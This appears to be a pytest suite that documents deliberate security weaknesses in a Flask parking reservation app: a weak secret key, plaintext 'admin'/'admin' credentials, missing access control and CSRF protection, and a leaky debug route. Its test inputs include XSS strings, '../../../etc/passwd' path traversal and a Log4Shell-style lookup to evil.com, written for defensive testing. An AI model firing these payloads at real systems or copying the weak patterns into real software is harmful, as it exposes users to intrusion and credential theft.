"""
Security-focused tests for the parking reservation system.
These tests document and verify various security vulnerabilities.
"""
import pytest
import json
import base64
from unittest.mock import patch

from app import app, users, data


class TestAuthenticationSecurity:
    """Test authentication and authorization security."""
    
    def test_weak_secret_key(self):
        """Test that the application uses a weak secret key."""
        # Documents security vulnerability
        assert app.secret_key == "123"
        assert len(app.secret_key) < 32  # Should be at least 32 characters
        assert app.secret_key.isdigit()  # Only digits, very weak
    
    def test_hardcoded_credentials(self):
        """Test that credentials are hardcoded in source code."""
        # Documents security vulnerability
        assert "admin" in users
        assert users["admin"] == "admin"
        assert "user" in users
        assert users["user"] == "pass"
    
    def test_plaintext_password_storage(self):
        """Test that passwords are stored in plaintext."""
        # Read users.json to verify plaintext storage
        with open('users.json', 'r') as f:
            user_data = json.load(f)
        
        for username, user_info in user_data["users"].items():
            password = user_info["password"]
            # Password should be hashed, but it's plaintext
            assert len(password) < 100  # Hashed passwords would be much longer
            assert not password.startswith('$')  # No hash prefix
    
    def test_session_hijacking_vulnerability(self, client):
        """Test session security vulnerabilities."""
        # Login
        response = client.post('/login', data={'u': 'admin', 'p': 'admin'})
        assert response.status_code == 302
        
        # Extract session cookie
        cookies = response.headers.getlist('Set-Cookie')
        session_cookie = None
        for cookie in cookies:
            if 'session=' in cookie:
                session_cookie = cookie
                break
        
        # Session should be secured but isn't
        if session_cookie:
            assert 'Secure' not in session_cookie  # Missing Secure flag
            assert 'HttpOnly' not in session_cookie  # Missing HttpOnly flag
            assert 'SameSite' not in session_cookie  # Missing SameSite
    
    def test_timing_attack_vulnerability(self, client):
        """Test timing attack vulnerability in login."""
        import time
        
        # Test with valid username, invalid password
        start = time.time()
        client.post('/login', data={'u': 'admin', 'p': 'wrong'})
        valid_user_time = time.time() - start
        
        # Test with invalid username
        start = time.time()
        client.post('/login', data={'u': 'nonexistent', 'p': 'wrong'})
        invalid_user_time = time.time() - start
        
        # Timing difference reveals user existence (vulnerability)
        # In a secure system, these times should be similar
        time_difference = abs(valid_user_time - invalid_user_time)
        
        # Document the vulnerability (times may vary significantly)
        print(f"Valid user time: {valid_user_time}")
        print(f"Invalid user time: {invalid_user_time}")
        print(f"Time difference: {time_difference}")
    
    def test_no_password_complexity_requirements(self, client):
        """Test that there are no password complexity requirements."""
        # This would be tested during user registration, but there's no registration endpoint
        # Documents the missing functionality
        pass
    
    def test_no_account_lockout(self, client):
        """Test that there's no account lockout after failed attempts."""
        # Multiple failed login attempts
        for _ in range(10):
            response = client.post('/login', data={'u': 'admin', 'p': 'wrong'})
            assert response.status_code == 302
        
        # Account should still be accessible (no lockout mechanism)
        response = client.post('/login', data={'u': 'admin', 'p': 'admin'})
        assert response.status_code == 302
        
        with client.session_transaction() as sess:
            assert sess.get('user') == 'admin'


class TestAuthorizationSecurity:
    """Test authorization and access control security."""
    
    def test_missing_authentication_checks(self, client, reset_global_data, mock_files):
        """Test that sensitive operations don't require authentication."""
        # Should require authentication but doesn't
        
        with patch('app.load_data'), patch('app.save_data'), patch('app.save_backup'):
            # Make reservation without logging in
            response = client.post('/add', data={
                'spot': 'A1',
                'name': 'Unauthorized User',
                'date': '2025-06-25'
            })
            assert response.status_code == 302  # Should be 401 or redirect to login
        
        with patch('app.load_data'), patch('app.save_data'):
            # Delete reservation without logging in
            response = client.get('/del?spot=A1')
            assert response.status_code == 302  # Should be 401 or redirect to login
    
    def test_admin_routes_without_authorization(self, client):
        """Test that admin routes are accessible without proper authorization."""
        # Access admin route without authentication
        with patch('app.load_data'):
            response = client.get('/admin')
            assert response.status_code == 200  # Should require admin role
        
        # Access debug route without authentication
        response = client.get('/debug')
        assert response.status_code == 200  # Should be completely disabled in production
    
    def test_privilege_escalation(self, client):
        """Test for privilege escalation vulnerabilities."""
        # Login as regular user
        response = client.post('/login', data={'u': 'user', 'p': 'pass'})
        assert response.status_code == 302
        
        # Try to access admin functions (should be denied but isn't)
        with patch('app.load_data'):
            response = client.get('/admin')
            assert response.status_code == 200  # Documents privilege escalation bug
    
    def test_no_role_based_access_control(self, client):
        """Test that there's no role-based access control."""
        # The application doesn't use the role information from users.json
        # All authenticated users have the same permissions
        pass


class TestInputValidationSecurity:
    """Test input validation and injection vulnerabilities."""
    
    def test_xss_in_reservation_names(self, client, reset_global_data, mock_files):
        """Test XSS vulnerability in reservation names."""
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            'javascript:alert("XSS")',
            '<svg onload=alert("XSS")>',
        ]
        
        with patch('app.load_data'), patch('app.save_data'), patch('app.save_backup'):
            for i, payload in enumerate(xss_payloads):
                response = client.post('/add', data={
                    'spot': f'A{i+1}',
                    'name': payload,
                    'date': '2025-06-25'
                })
                assert response.status_code == 302
                
                # XSS payload would be rendered without escaping (vulnerability)
    
    def test_html_injection(self, client, reset_global_data, mock_files):
        """Test HTML injection in form inputs."""
        html_payload = '<h1>INJECTED HTML</h1><p>This should not render as HTML</p>'
        
        with patch('app.load_data'), patch('app.save_data'), patch('app.save_backup'):
            response = client.post('/add', data={
                'spot': 'A1',
                'name': html_payload,
                'date': '2025-06-25'
            })
            assert response.status_code == 302
    
    def test_json_injection(self, client, reset_global_data, mock_files):
        """Test JSON injection in form inputs."""
        json_payload = '{"injected": "json", "admin": true}'
        
        with patch('app.load_data'), patch('app.save_data'), patch('app.save_backup'):
            response = client.post('/add', data={
                'spot': 'A1',
                'name': json_payload,
                'date': '2025-06-25'
            })
            assert response.status_code == 302
    
    def test_path_traversal(self, client):
        """Test path traversal vulnerabilities."""
        # Test with path traversal in spot parameter
        with patch('app.load_data'), patch('app.save_data'):
            response = client.get('/del?spot=../../../etc/passwd')
            assert response.status_code == 302
            # No validation of spot parameter (vulnerability)
    
    def test_no_input_length_limits(self, client, reset_global_data, mock_files):
        """Test that there are no input length limits."""
        very_long_input = "A" * 100000  # 100KB of data
        
        with patch('app.load_data'), patch('app.save_data'), patch('app.save_backup'):
            response = client.post('/add', data={
                'spot': 'A1',
                'name': very_long_input,
                'date': '2025-06-25'
            })
            assert response.status_code == 302
            # No length validation (DoS vulnerability)
    
    def test_special_character_handling(self, client, reset_global_data, mock_files):
        """Test handling of special characters and encoding."""
        special_inputs = [
            "'; DROP TABLE users; --",  # SQL injection style (though not applicable)
            "\x00\x01\x02",  # Null bytes and control characters
            "../../etc/passwd",  # Path traversal
            "${jndi:ldap://evil.com/a}",  # Log4Shell style
            "%3Cscript%3Ealert('XSS')%3C/script%3E",  # URL encoded XSS
        ]
        
        with patch('app.load_data'), patch('app.save_data'), patch('app.save_backup'):
            for i, payload in enumerate(special_inputs):
                response = client.post('/add', data={
                    'spot': f'A{i+1}',
                    'name': payload,
                    'date': '2025-06-25'
                })
                assert response.status_code == 302


class TestDataSecurityAndPrivacy:
    """Test data security and privacy issues."""
    
    def test_data_exposure_in_debug_route(self, client):
        """Test that debug route exposes sensitive data."""
        # Login first
        client.post('/login', data={'u': 'admin', 'p': 'admin'})
        
        response = client.get('/debug')
        assert response.status_code == 200
        
        # Debug route exposes sensitive information
        assert b'Users:' in response.data
        assert b'admin' in response.data  # Exposes usernames
        assert b'Session:' in response.data  # Exposes session data
    
    def test_admin_route_data_exposure(self, client, reset_global_data, sample_data):
        """Test that admin route exposes all reservation data."""
        global data
        data.update(sample_data)
        
        with patch('app.load_data'):
            response = client.get('/admin')
            assert response.status_code == 200
            
            # Admin route exposes all data without proper formatting
            assert b'<pre>' in response.data
    
    def test_error_information_disclosure(self, client):
        """Test that error pages disclose too much information."""
        response = client.get('/nonexistent-page')
        assert response.status_code == 404
        
        # Error handler exposes internal information
        assert b'Path not found:' in response.data
        assert b'Method:' in response.data
    
    def test_session_data_in_templates(self, authenticated_session):
        """Test that session data is exposed in templates."""
        response = authenticated_session.get('/')
        assert response.status_code == 200
        
        # Session data is passed to template (potential exposure)
        assert b'Welcome admin!' in response.data


class TestFileSystemSecurity:
    """Test file system security issues."""
    
    def test_predictable_file_paths(self):
        """Test that file paths are predictable and hardcoded."""
        from app import file_path, backup_file, log_file, user_file
        
        # File paths are predictable (security through obscurity failure)
        assert file_path == "data.json"
        assert backup_file == "backup.json"
        assert log_file == "actions.json"
        assert user_file == "users.json"
    
    def test_file_permissions(self):
        """Test file permissions (if files exist)."""
        import os
        import stat
        
        files_to_check = ["data.json", "backup.json", "users.json"]
        
        for filename in files_to_check:
            if os.path.exists(filename):
                file_stat = os.stat(filename)
                file_mode = file_stat.st_mode
                
                # Check if file is world-readable (potential security issue)
                world_readable = bool(file_mode & stat.S_IROTH)
                world_writable = bool(file_mode & stat.S_IWOTH)
                
                # Document potential security issues
                if world_readable:
                    print(f"Warning: {filename} is world-readable")
                if world_writable:
                    print(f"Warning: {filename} is world-writable")
    
    def test_backup_file_security(self, temp_dir, sample_data):
        """Test backup file security."""
        import os
        
        backup_file_path = os.path.join(temp_dir, 'test_backup.json')
        
        with patch('app.backup_file', backup_file_path):
            global data
            data.update(sample_data)
            
            from app import save_backup
            save_backup()
            
            # Backup file contains sensitive data and may not be properly secured
            assert os.path.exists(backup_file_path)
            
            with open(backup_file_path, 'r') as f:
                backup_content = f.read()
                assert 'John Doe' in backup_content  # Sensitive data in backup


class TestNetworkSecurity:
    """Test network-related security issues."""
    
    def test_debug_mode_enabled(self):
        """Test that debug mode is enabled (security risk)."""
        # Debug mode should be disabled in production
        # This is set in the if __name__ == "__main__" block
        pass
    
    def test_binding_to_all_interfaces(self):
        """Test that application binds to all interfaces."""
        # The app.run() call uses host="0.0.0.0" which binds to all interfaces
        # This is a security risk in production
        pass
    
    def test_no_https_enforcement(self, client):
        """Test that HTTPS is not enforced."""
        # Application doesn't enforce HTTPS
        # Session cookies don't have Secure flag
        response = client.post('/login', data={'u': 'admin', 'p': 'admin'})
        
        cookies = response.headers.getlist('Set-Cookie')
        for cookie in cookies:
            if 'session=' in cookie:
                assert 'Secure' not in cookie
                break
    
    def test_no_csrf_protection(self, client, reset_global_data, mock_files):
        """Test that there's no CSRF protection."""
        # Login
        client.post('/login', data={'u': 'admin', 'p': 'admin'})
        
        # Make state-changing request without CSRF token
        with patch('app.load_data'), patch('app.save_data'), patch('app.save_backup'):
            response = client.post('/add', data={
                'spot': 'A1',
                'name': 'CSRF Test',
                'date': '2025-06-25'
            })
            assert response.status_code == 302
            # Request succeeds without CSRF protection (vulnerability)
